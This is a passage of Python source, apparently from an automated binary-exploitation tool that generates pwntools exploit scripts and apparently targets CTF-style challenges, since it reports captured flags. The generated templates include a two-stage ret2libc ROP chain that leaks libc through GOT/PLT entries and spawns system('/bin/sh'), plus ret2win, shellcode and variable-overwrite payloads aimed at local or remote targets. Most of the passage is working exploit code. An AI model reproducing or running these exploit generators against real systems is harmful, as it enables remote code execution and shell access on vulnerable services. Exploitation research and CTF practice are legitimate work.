    log.info(f"pop rdi: {{hex(pop_rdi)}}")
    log.info(f"ret: {{hex(ret)}}")

    # TODO: Adjust offset based on binary
    offset = 72  # CHANGE THIS

    # Stage 1: Leak libc address
    payload1 = b"A" * offset
    payload1 += p64(pop_rdi)
    payload1 += p64({got_entry})
    payload1 += p64({plt_entry})
    payload1 += p64(elf.symbols['main'])  # Return to main

    io.sendline(payload1)

    # Parse leak (adjust based on output format)
    leak = u64(io.recv(6).ljust(8, b"\\x00"))
    log.success(f"Leaked {leak_func}: {{hex(leak)}}")

    # Calculate libc base
    libc.address = leak - libc.symbols['{leak_func}']
    log.success(f"libc base: {{hex(libc.address)}}")

    # Stage 2: system("/bin/sh")
    system = libc.symbols['system']
    binsh = next(libc.search(b"/bin/sh\\x00"))

    payload2 = b"A" * offset
    payload2 += p64(ret)  # Stack alignment
    payload2 += p64(pop_rdi)
    payload2 += p64(binsh)
    payload2 += p64(system)

    io.sendline(payload2)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_universal_template(self):
        """Always generate a universal starter template."""
        # Gather all discovered info
        info_lines = []

        # Protections
        info_lines.append(f"# Protections:")
        info_lines.append(f"#   NX: {self.binary.protections.nx}")
        info_lines.append(f"#   Canary: {self.binary.protections.canary}")
        info_lines.append(f"#   PIE: {self.binary.protections.pie}")
        info_lines.append(f"#   RELRO: {self.binary.protections.relro}")

        # Win function
        if self._win_func:
            info_lines.append(f"#   Win function: {self._win_func[0]} @ {hex(self._win_func[1])}")

        # Leaks
        if self.profile.leaked_addresses:
            info_lines.append(f"#   Leaked addresses: {self.profile.leaked_addresses}")

        # Gadgets
        if self._gadgets:
            gadgets_str = ", ".join(f"{k}: {hex(v)}" for k, v in self._gadgets.items())
            info_lines.append(f"#   Gadgets: {{{gadgets_str}}}")

        # Input patterns
        if self.profile.prompts:
            info_lines.append(f"#   Input prompts detected: {len(self.profile.prompts)}")

        info_str = "\n".join(info_lines)

        self.exploit_template = f'''#!/usr/bin/env python3
"""
Universal Exploit Template for {Path(self._binary_path).name}
Generated by supwngo EnhancedAutoExploit

{info_str}

Exploitation attempts:
{chr(10).join(f"#   - {a.get('technique', 'unknown')}: {a.get('result', 'unknown')}" for a in self.attempts)}
"""

from pwn import *

BINARY = "{self._binary_path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.arch = "{'amd64' if self.binary.bits == 64 else 'i386'}"
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # === ANALYSIS RESULTS ===
    # Win function: {f"{self._win_func[0]} @ {hex(self._win_func[1])}" if self._win_func else "Not found"}
    # Useful gadgets: {self._gadgets if self._gadgets else "None found"}

    # === FIND OFFSET ===
    # Use cyclic pattern to find offset:
    # payload = cyclic(500)
    # io.sendline(payload)
    # # Then in GDB: cyclic_find(0x<crash_addr>)

    offset = 0  # TODO: Find correct offset

    # === BUILD PAYLOAD ===
    payload = b"A" * offset

    # Option 1: ret2win (if win function exists)
    {f"# payload += p64({hex(self._win_func[1])})  # {self._win_func[0]}" if self._win_func else "# No win function found"}

    # Option 2: Shellcode (if NX disabled)
    # shellcode = asm(shellcraft.sh())
    # payload = shellcode + b"\\x90" * (offset - len(shellcode))
    # payload += p64(buffer_address)

    # Option 3: ret2libc (if dynamically linked)
    # rop = ROP(elf)
    # pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    # ret = rop.find_gadget(['ret'])[0]
    # payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

    # Option 4: Variable overwrite
    # payload = b"A" * var_offset + p32(magic_value)

    log.info(f"Sending payload ({{len(payload)}} bytes)")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def summary(self) -> str:
        """Get summary of exploitation attempt."""
        lines = [
            f"EnhancedAutoExploit Report: {Path(self._binary_path).name}",
            f"Result: {'SUCCESS' if self.successful else 'FAILED'}",
        ]

        # Verification status
        if self.verification_level != VerificationLevel.NONE:
            lines.append(f"Verification: {self.verification_level.name}")

        # Show captured flag
        if self._captured_flag:
            lines.append(f"FLAG CAPTURED: {self._captured_flag}")

        if self.successful:
            lines.append(f"Technique: {self.technique_used}")
            lines.append(f"Payload length: {len(self.final_payload)}")

        lines.append(f"\nAttempts ({len(self.attempts)}):")
        for attempt in self.attempts:
            status = attempt.get('result', 'unknown')
            technique = attempt.get('technique', 'unknown')
            lines.append(f"  - {technique}: {status}")
            if 'notes' in attempt:
                for note in attempt['notes']:
                    lines.append(f"      {note}")
            # Show verification for each attempt
            if 'verification' in attempt:
                v = attempt['verification']
                lines.append(f"      Verified: {v}")

        if self.profile.leaked_addresses:
            lines.append(f"\nDiscovered leaks: {self.profile.leaked_addresses}")

        lines.append(f"\nTemplate generated: {'Yes' if self.exploit_template else 'No'}")

        # Check for pwned file
        pwned_path = os.path.join(self._binary_dir, PWNED_FILE)
        if os.path.exists(pwned_path):
            lines.append(f"Shell verified: {pwned_path} created")

        return "\n".join(lines)


def auto_exploit(binary_path: str, **kwargs) -> EnhancedAutoExploiter:
    """
    Convenience function to auto-exploit a binary.

    Args:
        binary_path: Path to target binary
        **kwargs: Additional arguments for EnhancedAutoExploiter

    Returns:
        EnhancedAutoExploiter instance with results
    """
    from supwngo.core.binary import Binary

    binary = Binary.load(binary_path)
    exploiter = EnhancedAutoExploiter(binary, **kwargs)
    return exploiter.run()
